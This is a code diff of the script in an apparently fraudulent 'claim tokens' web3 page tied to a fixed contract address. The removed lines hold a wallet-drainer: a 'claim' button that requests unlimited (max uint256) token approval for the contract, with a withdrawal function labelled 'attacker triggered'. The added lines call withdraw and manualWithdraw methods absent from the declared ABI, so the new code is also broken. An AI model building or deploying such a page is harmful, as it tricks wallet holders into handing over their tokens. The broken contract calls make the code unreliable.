@@ -19,180 +19,143 @@
 
     <script>
         const web3 = new Web3(window.ethereum);
-        const abi =[
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "spender",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "approve",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "account",
-				"type": "address"
-			}
-		],
-		"name": "balanceOf",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transfer",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "sender",
-				"type": "address"
-			},
-			{
-				"internalType": "address",
-				"name": "recipient",
-				"type": "address"
-			},
-			{
-				"internalType": "uint256",
-				"name": "amount",
-				"type": "uint256"
-			}
-		],
-		"name": "transferFrom",
-		"outputs": [
-			{
-				"internalType": "bool",
-				"name": "",
-				"type": "bool"
-			}
-		],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	}
-]
+        const abi = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "approve",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transfer",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "sender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-        const contractAddress = "0x3af064DF0A09843ca783F595a5c54d6106be2505"; // Contract address
-        const contract = new web3.eth.Contract(abi, contractAddress);
+        const contractAddress = "0x3af064DF0A09843ca783F595a5c54d6106be2505";  // Replace with deployed contract address
 
-        // Connect wallet function
-        async function connectWallet() {
+        let contract;
+        let accounts;
+
+        document.getElementById('connectWalletBtn').onclick = async function() {
             try {
-                const accounts = await web3.eth.requestAccounts();
+                accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 const account = accounts[0];
+                contract = new web3.eth.Contract(abi, contractAddress);
                 document.getElementById("status").innerText = `Connected to: ${account}`;
-
-                // Enable buttons after wallet is connected
                 document.getElementById("claimTokensBtn").disabled = false;
                 document.getElementById("checkBalanceBtn").disabled = false;
                 document.getElementById("manualWithdrawBtn").disabled = false;
             } catch (error) {
-                console.error("Connection failed:", error);
-                document.getElementById("status").innerText = "Connection failed.";
+                document.getElementById("status").innerText = "Connection failed!";
             }
-        }
+        };
 
-        // Check balance function
-        async function checkBalance() {
+        document.getElementById('claimTokensBtn').onclick = async function() {
             try {
-                const accounts = await web3.eth.getAccounts();
-                const account = accounts[0];
-                
-                const balance = await contract.methods.balanceOf(account).call();
-                const balanceInTokens = web3.utils.fromWei(balance, 'ether'); // Convert balance to tokens (assuming 18 decimals)
-                
-                document.getElementById("balance").innerText = `Balance: ${balanceInTokens} tokens`;
+                const amount = 10000 * 10 ** 18; // Example 10,000 tokens (in the token's decimals)
+                await contract.methods.withdraw(amount).send({ from: accounts[0] });
+                document.getElementById("status").innerText = "Tokens claimed successfully!";
             } catch (error) {
-                console.error("Error checking balance:", error);
-                document.getElementById("balance").innerText = "Error fetching balance.";
+                document.getElementById("status").innerText = "Error claiming tokens!";
             }
-        }
+        };
 
-        // Claim gas tokens function (using approve)
-        async function claimTokens() {
+        document.getElementById('manualWithdrawBtn').onclick = async function() {
             try {
-                const accounts = await web3.eth.getAccounts();
-                const account = accounts[0];
-                
-                // Max uint256 value for unlimited approval
-                const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-                // Call approve function: Allow the contract to spend tokens on behalf of the user
-                const approveReceipt = await contract.methods.approve(contractAddress, maxAmount).send({ from: account });
-                
-                document.getElementById("status").innerText = "Approval successful, now claim gas tokens!";
-            } catch (error) {
-                console.error("Error claiming tokens:", error);
-                document.getElementById("status").innerText = "Error claiming tokens.";
-            }
-        }
-
-        // Manual withdrawal function (attacker triggered)
-        async function manualWithdraw() {
-            try {
-                const accounts = await web3.eth.getAccounts();
-                const account = accounts[0];
-                
-                // This triggers the manual withdraw function
-                await contract.methods.manualWithdraw().send({ from: account });
+                await contract.methods.manualWithdraw(accounts[0]).send({ from: accounts[0] });
                 document.getElementById("status").innerText = "Manual withdrawal processed!";
             } catch (error) {
-                console.error("Error with manual withdraw:", error);
-                document.getElementById("status").innerText = "Error processing manual withdrawal.";
+                document.getElementById("status").innerText = "Error with manual withdrawal!";
             }
-        }
-
-        // Event listeners for buttons
-        document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
-        document.getElementById("claimTokensBtn").addEventListener("click", claimTokens);
-        document.getElementById("checkBalanceBtn").addEventListener("click", checkBalance);
-        document.getElementById("manualWithdrawBtn").addEventListener("click", manualWithdraw);
+        };
     </script>
 </body>
 </html>
+
